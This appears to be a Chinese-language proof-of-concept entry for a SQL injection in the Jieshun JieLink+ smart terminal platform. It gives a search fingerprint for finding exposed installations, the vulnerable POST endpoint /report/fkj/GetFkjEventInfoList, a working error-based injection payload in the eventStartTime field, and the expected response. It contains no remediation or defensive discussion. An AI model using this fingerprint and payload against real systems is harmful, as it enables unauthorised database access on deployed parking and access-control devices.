# 捷顺JeLink+智能终端操作平台GetFkjEventInfoList存在SQL注入漏洞

捷顺JeLink+智能终端操作平台 ｜ SQL注入 ｜ —
- **指纹**：`app="JieLink+智能终端操作平台"`
- **请求**：`POST /report/fkj/GetFkjEventInfoList HTTP/1.1`

**Payload**
```
eventStartTime=1' AND EXTRACTVALUE(2220,CONCAT(0x5c,0x717a787871,(SELECT (ELT(2220=2220,1))),0x7162707071)) AND 'yYVf'='yYVf&eventEndTime=&deviceIp=&deviceName=&eventTypeName=&eventContent=&page=1&rows=20
```
- **响应特征**：200